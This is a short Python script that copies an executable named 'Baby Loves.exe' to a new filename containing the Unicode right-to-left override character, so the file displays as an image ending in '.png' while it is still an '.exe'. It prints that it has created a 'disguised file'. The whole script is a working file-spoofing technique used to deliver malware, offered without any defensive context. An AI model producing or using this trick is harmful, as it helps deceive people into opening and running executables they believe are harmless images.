filename = "Baby Loves" + "\u202e" + "gnp" + ".exe"
with open("Baby Loves.exe", "rb") as src:
    with open(filename, "wb") as dst:
        dst.write(src.read())
print("Created disguised file:", filename)
